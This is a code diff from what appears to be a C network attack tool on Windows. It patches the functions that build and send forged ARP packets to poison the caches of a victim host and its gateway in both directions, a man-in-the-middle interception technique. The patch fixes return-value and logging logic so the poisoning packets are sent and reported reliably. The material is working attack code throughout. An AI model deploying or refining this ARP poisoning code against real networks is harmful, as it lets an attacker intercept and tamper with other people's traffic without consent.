@@ -165,9 +165,7 @@ int SendArpPoison(PSCANPARAMS scanParamsParam, unsigned char victimMacBinParam[B
   MacBin2String(victimMacBinParam, (unsigned char *)victimMacStr, sizeof(victimMacStr));
   MacBin2String(scanParamsParam->LocalMacBin, (unsigned char *)localMacStr, sizeof(localMacStr));
   MacBin2String(scanParamsParam->GatewayMacBin, (unsigned char *)gatewayMacStr, sizeof(gatewayMacStr));
-
-  LogMsg(DBG_ERROR, "Poisoning  %s/%s <--> %s/%s", victimMacStr, victimIpStr, gatewayMacStr, gatewayIpStr);
-
+  
   // Poisoning from A to B.
   ZeroMemory(&arpPacket, sizeof(arpPacket));
 
@@ -185,11 +183,16 @@ int SendArpPoison(PSCANPARAMS scanParamsParam, unsigned char victimMacBinParam[B
   //printf("Poison(1) %s/%s    %s/%s -> %s/%s\n", lLocalMAC, lVicMAC, lLocalMAC, lGWIP, lVicMAC, lVicIP);
 
   // Send packet
-  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) != 0)
+  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) == FALSE)
   {
     LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet A2B");
     retVal = NOK;
   }
+  else
+  {
+    LogMsg(DBG_INFO, "Poisoning  %s/%s <--> %s/%s", victimMacStr, victimIpStr, gatewayMacStr, gatewayIpStr);
+  }
+
 
   // Poisoning from B to A.
   ZeroMemory(&arpPacket, sizeof(arpPacket));
@@ -207,7 +210,7 @@ int SendArpPoison(PSCANPARAMS scanParamsParam, unsigned char victimMacBinParam[B
   CopyMemory(arpPacket.ArpDstIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);
 
   // Send packet
-  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) != 0)
+  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) == FALSE)
   {
     LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet B2A");
     retVal = NOK;
@@ -222,7 +225,7 @@ END:
 
 BOOL SendArpPacket(void *interfaceHandleParam, PArpPacket arpPacketParam)
 {
-  int retVal = NOK;
+  BOOL retVal = FALSE;
   unsigned char arpPacket[sizeof(ETHDR) + sizeof(ARPHDR)];
   int counter = 0;
   PETHDR ethrHdrPtr = (PETHDR)arpPacket;
@@ -249,13 +252,16 @@ BOOL SendArpPacket(void *interfaceHandleParam, PArpPacket arpPacketParam)
   CopyMemory(arpHdrPtr->sha, arpPacketParam->ArpLocalMacBin, BIN_MAC_LEN);
 
   // Send down the packet
+  int funcRetVal = 0;
   if (interfaceHandleParam != NULL && 
-      pcap_sendpacket(interfaceHandleParam, arpPacket, sizeof(ETHDR) + sizeof(ARPHDR)) == 0)
+      (funcRetVal = pcap_sendpacket(interfaceHandleParam, arpPacket, sizeof(ETHDR) + sizeof(ARPHDR))) == 0)
   {
-    retVal = OK;
+    retVal = TRUE;
   }
-
-  LogMsg(DBG_ERROR, "SendARPPacket(): Error occured while sending the packet");
+  else
+  {
+    LogMsg(DBG_ERROR, "SendArpPacket(): Error occured while sending the packet");
+  }
 
   return retVal;
 }
